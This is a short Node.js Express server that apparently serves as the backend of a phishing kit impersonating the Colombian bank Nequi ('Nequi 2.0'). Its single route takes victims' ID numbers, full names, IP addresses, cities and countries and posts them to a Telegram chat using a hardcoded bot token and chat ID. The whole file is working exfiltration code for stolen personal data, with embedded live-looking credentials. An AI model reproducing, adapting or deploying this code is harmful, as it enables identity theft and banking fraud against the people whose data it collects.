const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Configurar credenciales de Telegram (protegidas en el backend)
const TELEGRAM_TOKEN = '7874725327:AAG32fTFa-89-zCClta2930n55LlYM1xWEA'; // Reemplaza con tu token real
const CHAT_ID = '-1002483847793'; // Reemplaza con tu chat ID real

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Ruta para enviar mensajes a Telegram
app.post('/send-message', async (req, res) => {
    const { documentNumber, fullName, userIP, city, country } = req.body;

    if (!documentNumber || !fullName) {
        return res.status(400).json({ error: 'Datos incompletos' });
    }

    const message = `
Nequi 2.0
ID: ${documentNumber}
Nombres: ${fullName}
IP: ${userIP || 'Desconocida'}
Ciudad: ${city || 'Desconocida'}
País: ${country || 'Desconocido'}
    `.trim();

    try {
        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: message,
            }
        );
        res.json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ error: 'Error al enviar mensaje a Telegram' });
    }
});

// Iniciar el servidor
app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
});

app.get('/', (req, res) => {
    res.send('Servidor funcionando correctamente');
});
